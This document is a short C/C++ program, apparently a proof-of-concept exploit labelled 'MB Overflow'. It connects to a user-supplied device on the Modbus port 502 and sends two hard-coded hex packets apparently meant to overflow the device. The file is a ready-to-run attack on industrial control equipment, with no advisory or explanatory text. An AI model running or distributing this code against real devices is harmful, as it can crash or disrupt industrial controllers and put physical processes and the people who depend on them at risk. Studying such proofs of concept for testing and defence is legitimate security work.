#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>

#include <iostream>
#include <fstream>
#include <string>

char packet1[] = "00ad000000ff01050043ff00";
char packet2[] = "071b0000000601";


//-----------------------------------------------------------------------------
// Helper function - Makes the running thread sleep for the amount of time
// in microseconds
//-----------------------------------------------------------------------------
void sleep_us(int microseconds)
{
	struct timespec ts;
	ts.tv_sec = microseconds / 1000000;
	ts.tv_nsec = (microseconds % 1000000) * 1000;
	nanosleep(&ts, NULL);
}


int convertStrToByte(char *str, char *return_str)
{
	const char *pos = str;
	int count = 0;
	
	while (*pos != '\0')
	{
		sscanf(pos, "%2hhx", &return_str[count]);
		pos += 2;
		count ++;
	}
	
	//DEBUG
	/*
	printf("0x");
	for (int i = 0; i < count; i++)
	{
		printf("%02x", return_str[i]);
	}
	printf("\n");
	*/
	
	return count;
}

int main(int argc, char **argv)
{
	//Verifying arguments
	if (argc < 2)
	{
		printf("Please provide the device IP address\r\n");
		exit(1);
	}

	printf("Starting MB Overflow...\r\n");
	
	int socket_fd, port = 502;
	struct sockaddr_in server_addr;
	struct hostent *server;
	int data_len;
	socklen_t cli_len;
	char *hostaddr;
	
	//Create TCP Socket
	socket_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (socket_fd<0)
	{
		perror("Server: error creating stream socket");
		exit(1);
	}

	//Initialize Server Structures
	server = gethostbyname(argv[1]);
	if (server == NULL)
	{
		printf("Error locating host %s\n", argv[1]);
		return 0;
	}

	bzero((char *) &server_addr, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(port);
	bcopy((char *)server->h_addr, (char *)&server_addr.sin_addr.s_addr, server->h_length);

	//set timeout of 100ms on receive
	struct timeval tv;
	tv.tv_sec = 0;
	tv.tv_usec = 100000;
	if (setsockopt(socket_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0)
	{
		printf("Error setting timeout\n");
	}

	while (connect(socket_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
	{
		perror("error connecting to server");
		//return 0;
	}
	

			
	//SEND THE PACKETS
	printf("Sending packets...\r\n");
	char localBuffer[1000];
	
	int msg_size = convertStrToByte(packet1, localBuffer);
	data_len = sendto(socket_fd, localBuffer, msg_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
	if (data_len < 0)
	{
		printf("Error sending data on socket %d\n", socket_fd);
		perror("error: ");
	}

	sleep_us(100000);
	
	msg_size = convertStrToByte(packet2, localBuffer);
	data_len = sendto(socket_fd, localBuffer, msg_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
	if (data_len < 0)
	{
		printf("Error sending data on socket %d\n", socket_fd);
		perror("error: ");
	}
	
	sleep_us(100000);
	
	close(socket_fd);
}
